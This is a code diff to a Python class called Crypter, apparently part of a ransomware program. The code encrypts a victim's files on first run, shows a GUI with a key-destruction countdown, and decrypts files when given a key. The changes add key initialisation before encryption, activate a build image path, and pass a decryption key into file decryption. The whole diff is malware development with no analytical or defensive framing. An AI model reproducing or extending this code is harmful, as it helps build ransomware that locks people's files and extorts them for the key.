@@ -43,6 +43,7 @@ class Crypter(Base.Base):
     # FIRST RUN
     # Encrypt!
     if not os.path.isfile(self.encrypted_file_list):
+      self.Crypt.init_keys()
       file_list = self.find_files()
       # Start encryption
       self.encrypt_files(file_list)
@@ -106,7 +107,7 @@ class Crypter(Base.Base):
     start_time = self.get_start_time()
     
     app = wx.App()
-    #sys._MEIPASS = "..\\..\\build_script\\images"
+    sys._MEIPASS = "..\\..\\build_script\\images"
     crypter_gui = Gui.MyFrame1(None, 
                                sys._MEIPASS, 
                                self.KEY_DESTRUCT_TIME_SECONDS, 
@@ -135,7 +136,7 @@ class Crypter(Base.Base):
     return file_list
 
 
-  def decrypt_file(self, encrypted_file):
+  def decrypt_file(self, encrypted_file, decryption_key):
     '''
     @summary: Processes the list of encrypted files and decrypts each. Should be called once per file
     @param encrypted_file: an encrypted file to decrypt
@@ -146,7 +147,7 @@ class Crypter(Base.Base):
       return
 
     # IF successful decryption, delete locked file
-    locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip())
+    locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip(), decryption_key)
     if locked_path:
       os.remove(locked_path)
       
